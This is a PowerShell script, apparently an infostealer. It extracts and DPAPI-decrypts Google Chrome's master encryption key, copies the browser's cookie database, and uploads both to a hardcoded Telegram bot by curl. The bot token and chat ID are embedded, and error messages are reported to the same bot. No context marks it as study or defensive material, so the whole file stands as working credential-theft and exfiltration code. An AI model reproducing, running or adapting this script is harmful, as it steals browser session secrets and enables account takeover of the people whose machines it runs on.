Add-Type -AssemblyName System.Security

$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

try {
    $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKey = [System.Convert]::FromBase64String($json.os_crypt.encrypted_key)
    $trimmedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($trimmedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $base64Key = [System.Convert]::ToBase64String($masterKey)

    $tempCookies = "$env:TEMP\c.db"
    Copy-Item $cookiePath $tempCookies -Force

    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatid" -d "text=SUCCESS_KEY: $base64Key"
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatid" -F "document=@$tempCookies"

    Remove-Item $tempCookies
    Write-Host "Done! Check Telegram."
} catch {
    $err = $_.Exception.Message
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatid" -d "text=ERROR: $err"
    Write-Host "Error sent to bot."
}